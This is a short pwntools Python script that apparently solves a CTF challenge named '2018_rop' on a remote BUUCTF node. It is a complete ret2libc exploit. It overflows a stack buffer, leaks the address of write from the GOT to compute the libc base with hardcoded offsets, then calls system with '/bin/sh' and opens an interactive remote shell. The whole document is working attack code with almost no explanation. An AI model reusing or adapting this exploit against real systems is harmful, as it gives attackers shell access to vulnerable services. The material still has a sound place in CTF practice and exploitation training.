from pwn import *

io = remote("node4.buuoj.cn", 25916)
# io = process('2018_rop')
e = ELF('2018_rop')

main_addr = e.symbols['vulnerable_function']
write_plt_addr = e.symbols['write']
write_got_addr = e.got['write']
read_got_addr = e.got['read']

junk = (0x88 + 4) * b'a'
payload1 = flat(junk, write_plt_addr, main_addr, 1, write_got_addr, 4)
io.sendline(payload1)
addr = io.recv()[:4]
true_address = u32(addr)
print(hex(true_address))

# sys.exit()
# https://libc.blukat.me/ 查一下
system = 0x03cd10
write = 0x0e56f0
str_bin_sh = 0x17b8cf

base = true_address - write
system = base + system
str_bin_sh = base + str_bin_sh

# local
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc_write = libc.symbols['write']
# offset = true_address - libc_write
#
# system = libc.symbols['system'] + offset
# str_bin_sh = libc.search(b'/bin/sh').__next__() + offset

payload2 = flat(junk, system, 1, str_bin_sh)
io.sendline(payload2)
io.interactive()
